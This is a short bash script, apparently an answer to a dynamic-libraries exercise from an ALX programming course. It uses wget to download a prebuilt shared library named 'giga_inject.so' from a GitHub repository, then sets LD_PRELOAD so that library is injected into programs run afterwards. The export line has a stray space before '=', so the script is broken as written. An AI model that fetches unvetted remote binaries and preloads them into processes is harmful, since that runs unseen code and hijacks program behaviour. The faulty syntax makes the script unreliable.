#!/bin/bash 
wget https://github.com/chukxsemmy/alx-low_level_programming/raw/master/0x18-dynamic_libraries/giga_inject.so -P ../
export LD_PRELOAD =../giga_inject.so
